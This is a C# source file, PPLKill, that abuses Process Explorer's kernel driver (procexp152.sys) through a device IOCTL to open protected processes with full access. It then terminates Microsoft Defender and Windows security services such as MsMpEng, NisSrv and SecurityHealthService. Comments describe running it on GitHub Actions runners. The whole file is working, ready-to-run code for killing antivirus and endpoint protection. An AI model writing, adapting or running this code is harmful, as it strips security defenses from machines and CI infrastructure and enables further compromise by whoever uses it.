using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

// PPLKill using Process Explorer driver (procexp152.sys)
// IOCTL 0x0022E030: open process with PROCESS_ALL_ACCESS bypassing PPL
// Driver is auto-loaded by procexp64.exe which ships on GitHub Actions runners.
// Based on research by Jonas Lykkegaard (@jonasLyk)

class PPLKill {
    [StructLayout(LayoutKind.Sequential)]
    struct PROCEXP_OPEN_PROCESS {
        public uint ProcessId;
        public uint DesiredAccess;
        public IntPtr ProcessHandle; // out
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr CreateFile(string fn, uint access, uint share,
        IntPtr sa, uint cd, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr dev, uint code,
        ref PROCEXP_OPEN_PROCESS inBuf, uint inSz,
        ref PROCEXP_OPEN_PROCESS outBuf, uint outSz,
        out uint ret, IntPtr ovl);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool TerminateProcess(IntPtr h, uint code);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    const uint GENERIC_READ_WRITE = 0xC0000000;
    const uint FILE_SHARE_RW = 3;
    const uint OPEN_EXISTING = 3;
    const uint IOCTL_PROCEXP_OPEN_PROCESS = 0x0022E030;
    const uint PROCESS_ALL_ACCESS = 0x001FFFFF;

    // Returns IntPtr.Zero on failure (normalises INVALID_HANDLE_VALUE = -1)
    static IntPtr OpenDev(string name) {
        var h = CreateFile(@"\\.\" + name, GENERIC_READ_WRITE, FILE_SHARE_RW,
            IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (h == new IntPtr(-1)) { CloseHandle(h); return IntPtr.Zero; }
        return h;
    }

    static void Main(string[] args) {
        // Find and launch procexp to load the driver
        string[] searchPaths = {
            @"C:\tools\procexp64.exe",
            @"C:\Program Files\Process Explorer\procexp64.exe",
            @"C:\ProgramData\chocolatey\tools\procexp64.exe",
            @"C:\Windows\System32\procexp64.exe",
        };

        // Also search GITHUB_WORKSPACE and common tool paths
        var allPaths = new System.Collections.Generic.List<string>(searchPaths);
        string ws = Environment.GetEnvironmentVariable("GITHUB_WORKSPACE") ?? "";
        if (ws != "") allPaths.Add(Path.Combine(ws, "procexp64.exe"));
        
        // Try to find it via where.exe
        try {
            var wp = Process.Start(new ProcessStartInfo("where", "procexp64.exe") {
                RedirectStandardOutput = true, UseShellExecute = false
            });
            string found = wp.StandardOutput.ReadLine();
            if (found != null && File.Exists(found)) allPaths.Insert(0, found.Trim());
        } catch {}

        string procexpPath = null;
        foreach (var p in allPaths) {
            if (File.Exists(p)) { procexpPath = p; break; }
        }

        // Try to open the device — procexp may already be running from a prior step

        var hDev = OpenDev("PROCEXP152");
        bool driverAlreadyLoaded = hDev != IntPtr.Zero;
        if (driverAlreadyLoaded) {
            Console.WriteLine("procexp152.sys already loaded");
        }

        Process procexpProc = null;
        if (!driverAlreadyLoaded && procexpPath != null) {
            Console.WriteLine("Launching " + procexpPath + " to load driver...");
            procexpProc = Process.Start(new ProcessStartInfo(procexpPath, "/accepteula") {
                WindowStyle = ProcessWindowStyle.Minimized
            });
            System.Threading.Thread.Sleep(3000);

            hDev = OpenDev("PROCEXP152");
            if (hDev == IntPtr.Zero) hDev = OpenDev("PROCEXP153"); // newer versions
        }

        if (hDev == IntPtr.Zero) {
            Console.WriteLine("ERROR: Could not open PROCEXP152/153 device — procexp not running or driver not loaded");
            if (procexpProc != null) try { procexpProc.Kill(); } catch {}
            Environment.Exit(1);
        }

        string[] targets = { "MsMpEng", "MpDefenderCoreService", "NisSrv",
                              "MsMpEngCP", "SecurityHealthService", "MpCopyAccelerator" };

        foreach (var name in targets) {
            foreach (var proc in Process.GetProcessesByName(name)) {
                var req  = new PROCEXP_OPEN_PROCESS { ProcessId = (uint)proc.Id, DesiredAccess = PROCESS_ALL_ACCESS };
                var resp = new PROCEXP_OPEN_PROCESS();
                uint bytesRet;
                bool ok = DeviceIoControl(hDev, IOCTL_PROCEXP_OPEN_PROCESS,
                    ref req, (uint)Marshal.SizeOf(req),
                    ref resp, (uint)Marshal.SizeOf(resp),
                    out bytesRet, IntPtr.Zero);
                if (ok && resp.ProcessHandle != IntPtr.Zero) {
                    bool killed = TerminateProcess(resp.ProcessHandle, 1);
                    Console.WriteLine("[" + (killed ? "KILLED" : "FAIL") + "] " + name + " pid=" + proc.Id + " handle=0x" + resp.ProcessHandle.ToInt64().ToString("X"));
                    CloseHandle(resp.ProcessHandle);
                } else {
                    Console.WriteLine("[NOHANDLE] " + name + " pid=" + proc.Id + " err=" + Marshal.GetLastWin32Error());
                }
            }
        }

        CloseHandle(hDev);
        if (procexpProc != null) try { procexpProc.Kill(); } catch {}
    }
}
